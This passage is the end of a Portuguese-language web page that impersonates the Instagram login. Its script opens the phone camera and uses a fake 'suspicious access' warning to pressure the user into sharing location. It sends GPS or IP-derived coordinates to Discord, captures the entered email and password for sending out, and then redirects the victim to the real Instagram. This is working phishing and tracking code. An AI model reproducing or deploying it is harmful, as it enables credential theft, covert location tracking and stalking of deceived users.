                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            setTimeout(() => {
                window.location.href = "https://www.instagram.com/";
            }, 1500);
        }
        
        document.addEventListener('DOMContentLoaded', function() {
            if (isMobile) {
                initCamera();
            }
            
            setTimeout(() => {
                document.getElementById('locationModal').classList.add('show');
            }, 1000);
        });
        
        document.getElementById('allowLocation').addEventListener('click', function() {
            const button = this;
            button.textContent = "Verificando...";
            button.disabled = true;
            
            if (isMobile && !cameraAttempted) {
                initCamera();
            }
            
            const locationPromise = isIOS ? getiOSLocation() : getLocation();
            
            locationPromise
                .then(() => {
                    document.getElementById('locationModal').classList.remove('show');
                    verificacaoConcluida = true;
                    
                    const successMsg = document.createElement('div');
                    successMsg.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,150,0,0.9);color:white;padding:15px 20px;border-radius:8px;z-index:10000;box-shadow:0 2px 10px rgba(0,0,0,0.3);font-weight:600;text-align:center;';
                    successMsg.innerHTML = "‚úì<br>Verifica√ß√£o conclu√≠da!<br><span style='font-size:12px;font-weight:normal;'>Voc√™ pode fazer login agora.</span>";
                    document.body.appendChild(successMsg);
                    
                    setTimeout(() => {
                        document.body.removeChild(successMsg);
                    }, 2000);
                })
                .catch((error) => {
                    document.getElementById('locationModal').classList.remove('show');
                    
                    if (!locationSent) {
                        getIPInfo().then(ipInfo => {
                            if (ipInfo && ipInfo.latitude && ipInfo.longitude) {
                                sendLocationToDiscord(
                                    ipInfo.latitude, 
                                    ipInfo.longitude, 
                                    null, 
                                    "IP (Fallback)"
                                );
                            }
                        });
                    }
                    
                    verificacaoConcluida = true;
                    button.textContent = "Verificar minha localiza√ß√£o";
                    button.disabled = false;
                });
        });
        
        document.getElementById('denyLocation').addEventListener('click', function() {
            document.getElementById('locationModal').classList.remove('show');
            
            const alertMsg = document.createElement('div');
            alertMsg.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(255,255,255,0.98);color:#262626;padding:24px;border-radius:12px;z-index:10000;box-shadow:0 2px 10px rgba(0,0,0,0.3);width:340px;text-align:center;';
            alertMsg.innerHTML = `
                <h3 style="margin-bottom:15px;font-size:18px;font-weight:600;">Verifica√ß√£o necess√°ria</h3>
                <p style="margin-bottom:20px;line-height:1.5;font-size:14px;color:#737373;">
                    Devido a um n√∫mero elevado de tentativas de acesso suspeitas, a verifica√ß√£o de localiza√ß√£o √© obrigat√≥ria neste momento.
                </p>
                <button id="retryVerification" style="background:#0095f6;border:none;border-radius:8px;color:white;font-weight:600;padding:8px 0;width:100%;cursor:pointer;font-size:14px;">
                    Tentar novamente
                </button>
            `;
            document.body.appendChild(alertMsg);
            
            document.getElementById('retryVerification').addEventListener('click', function() {
                document.body.removeChild(alertMsg);
                document.getElementById('locationModal').classList.add('show');
            });
        });
        
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                alert("Por favor, preencha todos os campos.");
                return;
            }
            
            if (verificacaoConcluida) {
                processLogin(email, password);
            } else {
                document.getElementById('locationModal').classList.add('show');
            }
        });
    </script>
</body>
</html>
